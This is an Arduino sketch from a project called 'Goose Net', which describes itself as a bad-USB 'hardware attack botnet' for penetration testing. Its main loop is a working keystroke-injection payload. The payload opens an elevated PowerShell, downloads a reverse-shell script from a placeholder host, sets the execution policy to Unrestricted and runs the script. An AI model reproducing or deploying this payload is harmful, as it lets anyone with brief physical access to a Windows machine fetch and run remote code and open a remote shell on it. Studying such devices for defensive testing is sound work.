/*
  Goose Net
  Goose net is an open source hardware attack botnet written in c#/processing
  and is used in conjunction with a bad usb at_tiny85 arduino usb keyboard emulator for use in a penetration
  testing environment.
  
  GNU General Public License (GPL) version 3
  
  Copyright (c) 2023 Anthony Logan Mitchell
  
  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.
  
  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
  GNU General Public License for more details.
  
  You should have received a copy of the GNU General Public License
  along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

//Converted at 2022-05-02 22:46:53.876381
#include "keymap.h"
#include "DigiKeyboard.h"

void setup() {
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
  digitalWrite(1, LOW);
  // don't need to set anything up to use DigiKeyboard
}

void loop(){

  DigiKeyboard.update();
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke('r', KEY_LEFT_GUI);
  DigiKeyboard.delay(700);
  DigiKeyboard.print("Run");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);  
  DigiKeyboard.delay(500);
  DigiKeyboard.print("PowerShell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_LEFTARROW);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  //Open a powershell client and download remote reverse shell script
  DigiKeyboard.print("$client = New-Object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$client.DownloadFile('<HOST_DOMAIN>/rs_tsk.ps1', 'C:\\rs_tsk.ps1')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  
  DigiKeyboard.print("Set-ExecutionPolicy -ExecutionPolicy Unrestricted");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
 
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  
  DigiKeyboard.print("C:\\rs_tsk.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  while(1){
  }
}
